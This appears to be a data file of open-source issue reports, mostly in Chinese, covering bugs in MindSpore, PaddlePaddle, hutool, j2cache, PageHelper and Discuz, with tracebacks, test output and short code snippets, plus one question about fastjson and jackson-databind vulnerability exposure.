epoch:1/3, iter-3000/9373,cur loss:15.1902, aver loss:15.1908,total_avg loss:15.1908, acc_aver:0.0004 2022-10-08 08:14:23.522239, epoch:1/3, iter-6000/9373,cur loss:12.5092, aver loss:13.8502,total_avg loss:13.8502, acc_aver:0.0040 2022-10-08 08:44:44.742455, epoch:1/3, iter-9000/9373,cur loss:10.6972, aver loss:12.7993,total_avg loss:12.7993, acc_aver:0.0126 """""" Traceback (most recent call last): File ""../train.py"", line 245, in &lt;module&gt; train() File ""../train.py"", line 242, in train train_net(hparams.rank, model_constructed, num_epochs, ds_train, ckpoint_cb, steps_per_epoch_train, minibatch_size) File ""../train.py"", line 123, in train_net for idx, (data, gt_classes) in enumerate(data_train): File ""/usr/local/python3.7.5/lib/python3.7/site-packages/mindspore/dataset/engine/iterators.py"", line 140, in __next__ data = self._get_next() File ""/usr/local/python3.7.5/lib/python3.7/site-packages/mindspore/dataset/engine/iterators.py"", line 252, in _get_next return [self._transform_md_to_output(t) for t in self._iterator.GetNextAsList()] RuntimeError: Exception thrown from PyFunc. ValueError: cannot reshape array of size 1878240 into shape (192,301,80) At: /ssd1/fdd/ecapa_tdnn/src/reader.py(144): __getitem__ /usr/local/python3.7.5/lib/python3.7/site-packages/mindspore/dataset/engine/datasets_user_defined.py(101): _cpp_sampler_fn Line of code : 206 File : mindspore/ccsrc/minddata/dataset/engine/datasetops/source/generator_op.cc """""""
当前时间30-31号时DateUtil.endOfMonth获取有问题，2月返回值出现31,"JDK版本： openjdk_8_201 hutool版本： 5.X.X   <code>: Calendar cal = Calendar.getInstance(); //设置年份 cal.set(Calendar.YEAR, 2020); //设置月份 cal.set(Calendar.MONTH, 1); //2月 System.out.println(DateUtil.getEndValue(cal, Calendar.DAY_OF_MONTH));"
SELECT LAST_INSERT_ID() 在正式环境返回0,"配置如上，SELECT LAST_INSERT_ID() 在测试环境返回值正常，但是在正式环境（阿里云rds）都为0   <code>: properties.setProperty(""IDENTITY"", ""MYSQL""); properties.setProperty(""ORDER"", ""AFTER""); properties.setProperty(""notEmpty"", ""TRUE""); configurer.setProperties(properties); @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id;"
【2.8.5-release】打包项目读取j2cache.properties/caffeine.properties文件路径问题,"【配置路径读取issue】 问题背景 问题剖析 解决方案 联系人 问题背景 附 【bootstrap.yml与j2cache.properies】两个配置文件一开始部分配置路径： ———————————————————————————————————————————— 希望作者能在新版本中提供fileinputstream读取配置文件的能力，或者我愿意提交这部分代码。无论是否是bug,我们业务希望读取jar之外的目录文件中的配置，而不是只允许相对路径。 由衷感谢作者提供的j2cache，解放了不少劳动力。   <code>: - 【用途】：我部门A项目集成了spring-boot以及作者您的j2chache,拿了caffeine和redis-cluster给db service做二级缓存,挺好用的。 - 【线下ok，打包部署报错】线下一切都没问题，部署打包成jar之后，测试环境启动报错： j2cache.properties文件路径不正确 【无论是相对路径/全路径/我都配置检查过】 - 【问题定位】再三验证确认后，我们打包的文件目录没问题，于是翻看源码发现是一个路径读取逻辑问题。我们这边所有配置都存放在jar包外的 ./config 目录下，路径指定的是linux全路径 /app/xxx/fonfig/j2cache.properies （通用的，解决完这个问题后发现caffeine.properies也加载不到） 这个方法内部实现是通过stream获取properties，问题就出在stream的获取方式 【J2CacheConfig#getConfigStream方法，第130行代码】 这是两个获取相对路径的方法， * 一个是J2Cache.class所在jar包的类路径【存在问题，jar中你提供了默认的j2cache.properies配置，很鸡肋，影响了我排查，当我配置路径为./j2cache.properies的时候会读到】 * 一个是类加载器，即使用J2Cache的父类加载器的类路径，姑且认为是我项目打包jar所在的类路径【我打包尝试把配置文件放在jar里面打包到class路径，也读不到，放弃】 一、问题一：很好处理 用你们的J2CacheCOnfig#initFromConfig(InputStream stream)重载方法，拿到我自己解析的stream即可。不使用你们的J2CacheCOnfig#initFromConfig(String resourcePath)方法 二、问题二：很难处理 只能复制改写源码/aop/或者寻求作者发布新特性了。 aop你们是lazyload caffeine,对象是在map里的不归spring管，所以无法实现。 所以我只能粗暴把相关链路的代码copy一份myxxxx放在我项目里。去改写文件读取路径 问题出现在CaffeineProvider#start方法（148行）的文件加载逻辑中，同样的，不赘述，跟j2cache.properies路径读取问题一模一样 至此，问题解决，附 1.我线上的项目打包路径（配置/jar） 2.上线时的全路径配置"
[CT][MS][OP] Cummin has some problems at ascend,": Ascend PyNative and Graph /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_cummin_shape_2x8x16x14 检查 Cummin 的doc资料 在Ascend环境，两种模式下，运行测试样例 属性 axis 设置非0时，出现AssertionError Args：中，写到axis只要在input_x的shape的索引范围内就可以，这里axis取值 -4 、-3、-2、-1、1、2、3都出现AssertionError问题   <code>: Args: - **axis** (int) - The dimension to do the operation, The axis is in the range from -len(`input_x`.shape) to len(`input_x`.shape) - 1. When it's in the range from 0 to len(`input_x`.shape) - 1, it means starting from the first dimension and counting forwards, When it's less than 0, it means we're counting backwards from the last dimension. for example, -1 means the last dimension. def test_cummin_shape_2x8x16x14(): input_x = Tensor(np.random.randn(2, 8, 16, 14), dtype=mstype.int32) fact = CumminMock(attributes={'axis': 2}, inputs=[input_x]) &gt; fact.forward_cmp() MindSporeTest/operations/test_cummin.py:46: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ MindSporeTest/share/ops/primitive/cummin_ops.py:63: in forward_cmp allclose_nparray(out_pytorch[index], out_mindspore[index], self.loss, self.loss) MindSporeTest/share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[ 0, 0, 0, ..., 0, 0, 0], [ 0, 0, 0, ..., 0, -1, 0], [ 0, 0, 0, ..., -1, -1, -1]..., -1, ..., -1, -1, -1], [-1, -1, -1, ..., -1, -1, -1], [-1, -1, -1, ..., -1, -1, -1]]]], dtype=int32) data_me = array([[[[ 0, 0, 0, ..., 0, 0, 0], [ 0, 0, 0, ..., 0, -1, 0], [ 3, 0, 0, ..., -1, 0, -1]..., -2, ..., -1, -1, -2], [-2, -2, -1, ..., -1, -1, -1], [-1, -2, -2, ..., -2, -2, -2]]]], dtype=int32) rtol = 0, atol = 0 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[-1 0 0 ... -1 -1 -1] E data_me_error:[ 0 3 1 ... -2 -2 -2] E loss:[1 3 1 ... 1 1 1] def test_cummin_shape_2x8x16x14(): input_x = Tensor(np.random.randn(2, 8, 16, 14), dtype=mstype.int32) fact = CumminMock(attributes={'axis': -3}, inputs=[input_x]) &gt; fact.forward_cmp() MindSporeTest/operations/test_cummin.py:46: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ MindSporeTest/share/ops/primitive/cummin_ops.py:63: in forward_cmp allclose_nparray(out_pytorch[index], out_mindspore[index], self.loss, self.loss) MindSporeTest/share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[-1, 0, 0, ..., 1, 0, 0], [ 0, 0, 0, ..., -1, -1, 0], [ 0, 0, 1, ..., -1, 0, 0]..., -1, ..., -1, -1, -1], [-1, -1, 0, ..., -1, -1, -2], [-1, -1, -1, ..., -1, -2, -2]]]], dtype=int32) data_me = array([[[[-1, 0, 0, ..., 1, 0, 0], [ 0, 0, 0, ..., -1, -1, 0], [ 0, 0, 1, ..., -1, 0, 0]..., 0, ..., -1, -1, -1], [-2, 0, 0, ..., 0, -1, -1], [-1, -1, -1, ..., -1, -1, -2]]]], dtype=int32) rtol = 0, atol = 0 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[-1 -2 0 ... 0 -1 -2] E data_me_error:[ 0 0 2 ... -1 0 -1] E loss:[1 2 2 ... 1 1 1]"
paddle v1.5 动态图下scatter函数会被清零,"scatter函数bug复现 输出 - CPU和GPU都能复现这个问题 正确输出 bug代码定位如下： CPU版代码 - https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/fluid/operators/scatter.h#L134 GPU版代码 - https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/fluid/operators/scatter.cu.h#L99   <code>: import numpy as np import paddle.fluid as fluid def test_scatter_add(): input = fluid.dygraph.to_variable( np.array([[1, 2], [5, 6]], dtype='float32'), ) index = fluid.dygraph.to_variable( np.array([0, 1], dtype=np.int32) ) updates = fluid.dygraph.to_variable( np.array([[3, 4], [3, 4]], dtype='float32'), ) output = fluid.layers.scatter(input, index, updates, overwrite=False) print(output.numpy()) with fluid.dygraph.guard(fluid.CUDAPlace(0)): test_scatter_add() [[3. 4.] [3. 4.]] [[4. 6.] [8. 10.]]"
与Mapper一起用时，以传入RowBounds的形式分页查询，在reasonable=false的配置下，page=0仍有数据返回,"版本 Mybatis_PageHelper 4.1.6 tk.mybatis:mapper:3.3.8 说明： reasonable=false的功能为：禁用合理化时，如果pageNum&lt;1或pageNum&gt;pages会返回空数据 结果： pageNum&lt;0 无数据返回，返回null（正常，是否合理？） pageNum=0 会有数据返回，为第一页数据（非正常数据） pageNum&gt;pages 无数据返回，返回空集合（正常） 代码片段：   <code>: PageHelper.orderBy(""status DESC,id DESC""); List&lt;Address&gt; list = addressMapper.selectByRowBounds(condition, new RowBounds(page, Constants.PAGE_SIZE)); PageInfo&lt;Address&gt; result = new PageInfo&lt;Address&gt;(list);"
"[MS] When shape or dtype of AddN's input are inconsistent, the error message is not appropriate  ",": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_ms_error_whitelist_check_fusion_op_0001 AddN算子输入的shape、dtype不一致时，报错信息需修改。 shape不一致时报错如下所示 dtype不一致时报错信息如下所示 AddN算子输入的shape、dtype不一致时，报错信息需修改   <code>: [EXCEPTION] CORE(93842,ffff9b19f480,python):2021-09-16-15:49:41.829.802 [mindspore/core/ops/addn.cc:54] AddNInferShape] AddNShape of input[1]: (2, 3) are not consistent with the shape of input[0](2, 4) [ERROR] DEBUG(93842,ffff9b19f480,python):2021-09-16-15:49:41.829.994 [mindspore/ccsrc/debug/trace.cc:129] TraceGraphEval] *******************************graph evaluate stack********************************** #0 graph:construct_wrapper.0 with args[z:&lt;List[Tensor(F32)*4]&gt;,]In file rongheop.py(33) def construct(self, z): #1 graph:construct.1 with args[z:&lt;List[Tensor(F32)*4]&gt;,]In file rongheop.py(33) def construct(self, z): ************************************************************************************* Traceback (most recent call last): File ""rongheop.py"", line 41, in &lt;module&gt; output = net([x, y, x, y]) File ""/root/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in __call__ out = self.compile_and_run(*inputs) File ""/root/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 678, in compile_and_run self.compile(*inputs) File ""/root/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 665, in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/root/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/common/api.py"", line 539, in compile result = self._graph_executor.compile(obj, args_list, phase, use_vm, self.queue_name) ValueError: mindspore/core/ops/addn.cc:54 AddNInferShape] AddNShape of input[1]: (2, 3) are not consistent with the shape of input[0](2, 4) The function call stack (See file '/home/jenkins/djl/mindspore/model_zoo/official/cv/lenet/rank_0/om/analyze_fail.dat' for more details): # 0 In file rongheop.py(34) return self.addN(z) ^ # 1 In file rongheop.py(34) return self.addN(z) ^ [WARNING] PIPELINE(93842,ffff9b19f480,python):2021-09-16-15:49:43.274.616 [mindspore/ccsrc/pipeline/jit/init.cc:306] operator()] Start releasing dataset handles... [WARNING] PIPELINE(93842,ffff9b19f480,python):2021-09-16-15:49:43.660.997 [mindspore/ccsrc/pipeline/jit/init.cc:309] operator()] End release dataset handles. [EXCEPTION] CORE(94264,ffff8b2bf480,python):2021-09-16-15:50:53.968.642 [mindspore/core/utils/check_convert_utils.cc:622] _CheckTypeSame] For AddN's input type is not same : [ name : element_0 ,type : Tensor[Float32]][ name : element_1 ,type : Tensor[Float16]][ name : element_2 ,type : Tensor[Float32]][ name : element_3 ,type : Tensor[Float16]] [ERROR] DEBUG(94264,ffff8b2bf480,python):2021-09-16-15:50:53.968.835 [mindspore/ccsrc/debug/trace.cc:129] TraceGraphEval] *******************************graph evaluate stack********************************** #0 graph:construct_wrapper.0 with args[z:&lt;List[Tensor(F32),Tensor(F16),Tensor(F32),Tensor(F16)]&gt;,]In file rongheop.py(33) def construct(self, z): #1 graph:construct.1 with args[z:&lt;List[Tensor(F32),Tensor(F16),Tensor(F32),Tensor(F16)]&gt;,]In file rongheop.py(33) def construct(self, z): ************************************************************************************* Traceback (most recent call last): File ""rongheop.py"", line 41, in &lt;module&gt; output = net([x, y, x, y]) File ""/root/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in __call__ out = self.compile_and_run(*inputs) File ""/root/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 678, in compile_and_run self.compile(*inputs) File ""/root/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 665, in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/root/miniconda3/envs/djl/lib/python3.7/site-packages/mindspore/common/api.py"", line 539, in compile result = self._graph_executor.compile(obj, args_list, phase, use_vm, self.queue_name) TypeError: mindspore/core/utils/check_convert_utils.cc:622 _CheckTypeSame] For AddN's input type is not same : [ name : element_0 ,type : Tensor[Float32]][ name : element_1 ,type : Tensor[Float16]][ name : element_2 ,type : Tensor[Float32]][ name : element_3 ,type : Tensor[Float16]] The function call stack (See file '/home/jenkins/djl/mindspore/model_zoo/official/cv/lenet/rank_0/om/analyze_fail.dat' for more details): # 0 In file rongheop.py(34) return self.addN(z) ^ # 1 In file rongheop.py(34) return self.addN(z) ^ [WARNING] PIPELINE(94264,ffff8b2bf480,python):2021-09-16-15:50:55.283.292 [mindspore/ccsrc/pipeline/jit/init.cc:306] operator()] Start releasing dataset handles... [WARNING] PIPELINE(94264,ffff8b2bf480,python):2021-09-16-15:50:55.667.018 [mindspore/ccsrc/pipeline/jit/init.cc:309] operator()] End release dataset handles."
build fails due to softmax dependency issue,http://172.19.32.197:8111/viewLog.html?buildId=30826&amp;tab=buildLog&amp;buildTypeId=Manylinux1_Cuda80cudnn5avxOpenblas&amp;logTab=tree&amp;filter=important&amp;_focus=2395 looks either softmax or math_function is missing the dependency declaration of the cblas   <code>: In file included from /paddle/paddle/fluid/operators/math/softmax.cu:17:0: [05:04:40] /paddle/paddle/fluid/operators/math/math_function.h:36:19: fatal error: cblas.h: No such file or directory [05:04:40] #include &lt;cblas.h&gt; [05:04:40] ^ [05:04:40] compilation terminated.
在paddleseg预训练模型恢复训练报错,"WARNING:root:DataLoader reader thread raised an exception. Traceback (most recent call last): File ""PaddleSeg/train.py"", line 190, in main(args) File ""PaddleSeg/train.py"", line 185, in main fp16=args.fp16) File ""/home/aistudio/PaddleSeg/paddleseg/core/train.py"", line 139, in train for data in loader: File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 204, in next data = self.<em>reader.read_next_var_list() SystemError: (Fatal) Blocking queue is killed because the data reader raises an exception. [Hint: Expected killed</em> != true, but received killed_:1 == true:1.] (at /paddle/paddle/fluid/operators/reader/blocking_queue.h:166) Exception in thread Thread-2: Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/threading.py"", line 926, in _bootstrap_inner self.run() File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/threading.py"", line 870, in run self._target(*self._args, **self._kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 199, in _thread_loop six.reraise(*sys.exc_info()) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/six.py"", line 703, in reraise raise value File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 167, in _thread_loop batch = self._dataset_fetcher.fetch(indices) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/fetcher.py"", line 61, in fetch data = [self.dataset[idx] for idx in batch_indices] File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/fetcher.py"", line 61, in data = [self.dataset[idx] for idx in batch_indices] File ""/home/aistudio/PaddleSeg/paddleseg/datasets/dataset.py"", line 165, in getitem im, label = self.transforms(im=image_path, label=label_path) File ""/home/aistudio/PaddleSeg/paddleseg/transforms/transforms.py"", line 56, in call im = cv2.imread(im).astype('float32') AttributeError: 'NoneType' object has no attribute 'astype' 这是我断点续训的代码，麻烦各位帮我看看为啥报错   <code>: !python PaddleSeg/train.py --config my_deeplabv3.yml --do_eval --use_vdl --save_dir /home/aistudio/output_deeplabv3_1 --resume_model /home/aistudio/output_deeplabv3_1/iter_20000 --save_interval 2000```"
"[CT][MS][dynamic_shape]op reshape input two tensors, error on ascend","Reshape算子的第二个输入为Tensor时，Ascend上结果异常 / 硬件环境: /device ascend : -- MindSpore version :5a6a2d79， master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph python reshape.py [[1 2] [1 2]] pynative 模式报错 RuntimeError: mindspore/ccsrc/kernel/ascend_kernel_mod.cc:23 UpdateOp] : The pointer[stream_] is null. 图模式输出 [[0 0] [0 0]]   <code>: import mindspore.ops.operations as P from mindspore.nn import Cell from mindspore.common import Tensor, dtype from mindspore import context #context.set_context(save_graphs=True, save_graphs_path=""./dynamic_shape"") #context.set_context(mode=context.PYNATIVE_MODE) class Net(Cell): def __init__(self): super().__init__() self.reshape = P.Reshape() def construct(self, x, y): u = self.reshape(x, y) return u net = Net() x = Tensor([1, 2, 1, 2]) y = Tensor([2, 2]) print(net(x, y))"
@Request、@Get、@Post等请求注解支持增加value属性作为url属性的别名,"@Request、@Get、@Post等请求注解支持增加value属性作为url属性的别名。   <code>: @Get(""http://localhost:8080/result"") Boolean getBooleanResult(); @Post(""http://localhost:8080/user"") String postUser(@JSONBody Map user);"
[Pylint Error] tensor_map variable is not defined,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : In method defined in file, variable is not defined. Fix the pylint error.   <code>: _load_tensor_for_layerwise() mindspore\train\serialization.py tensor_map"
【众智】【计算-GPU开发】SpaceToBatchND,"Divides spatial dimensions into blocks and combines the block size with the original batch. This operation will divide spatial dimensions (H, W) into blocks with block_shape, the output tensor’s H and W dimension is the corresponding number of blocks after division. The output tensor’s batch dimension is the product of the original batch and the product of block_shape. Before division, the spatial dimensions of the input are zero padded according to paddings if necessary. 接口参考库上： https://www.mindspore.cn/docs/api/zh-CN/r1.6/api_python/ops/mindspore.ops.SpaceToBatchND.html#mindspore.ops.SpaceToBatchND x y block_shape Union[list(int), tuple(int), int] 属性 paddings Union[tuple, list] 属性 对应底层算子 Classify Name Type Type Range Required INPUT x float16, float32, double TRUE OUTPUT y float16, float32, double TRUE ATTR block_shape Union[list(int), tuple(int), int]) int32, int64 TRUE ATTR paddings Union[tuple, list] int32, int64 TRUE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/SpaceToBatchND?hl=zh-cn 3. 异常处理 4. 算子反向   <code>: class SpaceToBatch(PrimitiveWithInfer):"
discuz 20210920之后的几个版本，冻结账号后，需要验证邮箱激活的点击发送按钮链接消失了,"discuz 20210920之后的几个版本，冻结账号后，需要验证邮箱激活的点击发送按钮链接消失了 疑似问题重现步骤 希望之后的版本修复这个bug问题，因为这样会导致用户无法发送邮件验证 版本信息 Discuz! 版本:Discuz! X3.4 Rv3.4-202109270501-c163365b GBK（非正式版） Release 版本:Discuz! X3.4 Rv3.4-202109270501-c163365b GBK（非正式版） 服务器系统版本:centos 7.7 PHP 版本:7.4 MySQL / MariaDB 版本:5.7 内存缓存类型和版本:redis 5.0 其他信息 新需求操作步骤 为解决问题做过哪些尝试 其他信息   <code>: 'freeze_email_tips' =&gt; '您当前的帐号已经被冻结，必须验证邮箱后才能解除冻结状态 &lt;a href=""home.php?mod=spacecp&amp;ac=profile&amp;op=password&amp;resend=1"" class=""xi2""&gt;重新接收验证邮件&lt;/a&gt;',"
json-bind&fastjson漏洞,若依：&lt;fastjson.version&gt;1.2.60&lt;/fastjson.version&gt;   <code>: &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt; 经网上公布的资料，漏洞版本若依均有覆盖，本打算移除jackson，发现项目中存在依赖， 是否存在影响，有计划修复版本吗？谢谢
"[论文复现]Syntax error: word unexpected (expecting "")"")插入图片","notebook运行： 报错： 环境配置：高级版 python3.7   <code>: ![image](图片地址) Syntax error: word unexpected (expecting "")"")"
2.0rc1“数据集定义与加载”文档似乎有问题,"2.0rc1“数据集定义与加载”文档 https://www.paddlepaddle.org.cn/documentation/docs/zh/2.0-rc1/guides/02_paddle2.0_develop/02_data_load_cn.html 实现为项目https://aistudio.baidu.com/aistudio/projectdetail/1437925 按照所说的“# 如果要加载自定义数据集，将train_dataset 换为 train_dataset2即可” 运行cell： train_loader = paddle.io.DataLoader(train_dataset2, batch_size=2, shuffle=True) for batch_id, data in enumerate(train_loader()): x_data = data[0] y_data = data[1] print(batch_id,x_data.numpy().shape) print(batch_id,y_data.numpy().shape) 报错： WARNING:root:DataLoader reader thread raised an exception. Exception in thread Thread-6: Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/threading.py"", line 926, in _bootstrap_inner self.run() File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/threading.py"", line 870, in run self._target(*self._args, **self._kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 338, in _thread_loop six.reraise(*sys.exc_info()) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/six.py"", line 703, in reraise raise value File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 308, in _thread_loop batch = self._dataset_fetcher.fetch(indices) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/fetcher.py"", line 65, in fetch data = self.collate_fn(data) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 95, in default_collate_fn raise RuntimeError(""Unknown data type {}"".format(type(slot[0]))) RuntimeError: Unknown data type &lt;class 'str'&gt; ---------------------------------------------------------------------------SystemError Traceback (most recent call last) in 2 # train_dataset 取自第一段代码框架自带数据集中定义的数据集 3 # 如果要加载自定义数据集，将train_dataset 换为 train_dataset2即可 ----&gt; 4 for batch_id, data in enumerate(train_loader()): 5 x_data = data[0] 6 y_data = data[1] /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py in next(self) 354 try: 355 if in_dygraph_mode(): --&gt; 356 return self.<em>reader.read_next_var_list() 357 else: 358 if self.<em>return_list: SystemError: (Fatal) Blocking queue is killed because the data reader raises an exception. [Hint: Expected killed</em> != true, but received killed</em>:1 == true:1.] (at /paddle/paddle/fluid/operators/reader/blocking_queue.h:154) [Hint: If you need C++ stacktraces for debugging, please set .]   <code>: FLAGS_call_stack_level=2"
set MKL search path with intel64,"follow issue: https://github.com/baidu/Paddle/issues/103 more strict MKL cmake module refer: https://github.com/BVLC/caffe/blob/master/cmake/Modules/FindMKL.cmake Currently, we just firstly fix this issue temporarily, do more better integration later. the +find_path(MKL_INCLUDE_DIR mkl.h PATHS ${MKL_ROOT}/include ${MKL_ROOT}/lib/intel64) in https://github.com/baidu/Paddle/issues/103 is not correct. check MKL installation as follow: . |-- benchmarks | |-- hpcg | |-- linpack | -- mklvars.sh |-- examples | |-- examples_cluster_c.tgz | |-- examples_cluster_f.tgz | |-- examples_core_c.tgz | |-- examples_core_f.tgz | -- mkl_vsl_types.h |-- interfaces | |-- blas95 | |-- fftw2xc | |-- fftw2xf | |-- fftw3xc | |-- fftw3xf | -- intel64_lin -- mkl_link_tool 21 directories, 81 files . |-- benchmarks | |-- hpcg | |-- linpack | -- mklvars.sh |-- examples | |-- examples_cluster_c.tgz | |-- examples_cluster_f.tgz | |-- examples_core_c.tgz | |-- examples_core_f.tgz | -- mkl_vsl_types.h |-- interfaces | |-- blas95 | |-- fftw2xc | |-- fftw2xf | |-- fftw3xc | |-- fftw3xf | -- intel64_lin -- mkl_link_tool 21 directories, 81 files . |-- intel64 -&gt; ./intel64_lin -- locale   <code>: -- mp_linpack |-- bin | |-- mklvars.csh | -- examples_f95.tgz |-- include | |-- blas.f90 | |-- fftw | |-- i_malloc.h | |-- intel64 | |-- lapack.f90 | |-- mkl_blacs.h | |-- mkl_blas.fi | |-- mkl_blas.h | |-- mkl_cblas.h | |-- mkl_cdft.f90 | |-- mkl_cdft.h | |-- mkl_cdft_types.h | |-- mkl_cluster_sparse_solver.f90 | |-- mkl_cluster_sparse_solver.fi | |-- mkl_cluster_sparse_solver.h | |-- mkl_df_defines.h | |-- mkl_df.f90 | |-- mkl_df_functions.h | |-- mkl_df.h | |-- mkl_dfti.f90 | |-- mkl_dfti.h | |-- mkl_df_types.h | |-- mkl_direct_blas.h | |-- mkl_direct_call.fi | |-- mkl_direct_call.h | |-- mkl_dnn.h | |-- mkl_dnn_types.h | |-- mkl_dss.f90 | |-- mkl_dss.fi | |-- mkl_dss.h | |-- mkl.fi | |-- mkl.h | |-- mkl_lapacke.h | |-- mkl_lapack.fi | |-- mkl_lapack.h | |-- mkl_pardiso.f90 | |-- mkl_pardiso.fi | |-- mkl_pardiso.h | |-- mkl_pblas.h | |-- mkl_poisson.f90 | |-- mkl_poisson.h | |-- mkl_rci.f90 | |-- mkl_rci.fi | |-- mkl_rci.h | |-- mkl_scalapack.h | |-- mkl_service.f90 | |-- mkl_service.fi | |-- mkl_service.h | |-- mkl_solvers_ee.fi | |-- mkl_solvers_ee.h | |-- mkl_sparse_handle.f90 | |-- mkl_sparse_handle.fi | |-- mkl_sparse_handle.h | |-- mkl_spblas.f90 | |-- mkl_spblas.fi | |-- mkl_spblas.h | |-- mkl_trans.fi | |-- mkl_trans.h | |-- mkl_trig_transforms.f90 | |-- mkl_trig_transforms.h | |-- mkl_types.h | |-- mkl_version.h | |-- mkl_vml_defines.h | |-- mkl_vml.f90 | |-- mkl_vml.fi | |-- mkl_vml_functions.h | |-- mkl_vml.h | |-- mkl_vml_types.h | |-- mkl_vsl_defines.h | |-- mkl_vsl.f90 | |-- mkl_vsl.fi | |-- mkl_vsl_functions.h | |-- mkl_vsl.h | |-- mkl_vsl_subroutine.fi | -- lapack95 |-- lib | |-- intel64 -&gt; ./intel64_lin | -- tools |-- builder -- mp_linpack |-- bin | |-- mklvars.csh | -- examples_f95.tgz |-- include | |-- blas.f90 | |-- fftw | |-- i_malloc.h | |-- intel64 | |-- lapack.f90 | |-- mkl_blacs.h | |-- mkl_blas.fi | |-- mkl_blas.h | |-- mkl_cblas.h | |-- mkl_cdft.f90 | |-- mkl_cdft.h | |-- mkl_cdft_types.h | |-- mkl_cluster_sparse_solver.f90 | |-- mkl_cluster_sparse_solver.fi | |-- mkl_cluster_sparse_solver.h | |-- mkl_df_defines.h | |-- mkl_df.f90 | |-- mkl_df_functions.h | |-- mkl_df.h | |-- mkl_dfti.f90 | |-- mkl_dfti.h | |-- mkl_df_types.h | |-- mkl_direct_blas.h | |-- mkl_direct_call.fi | |-- mkl_direct_call.h | |-- mkl_dnn.h | |-- mkl_dnn_types.h | |-- mkl_dss.f90 | |-- 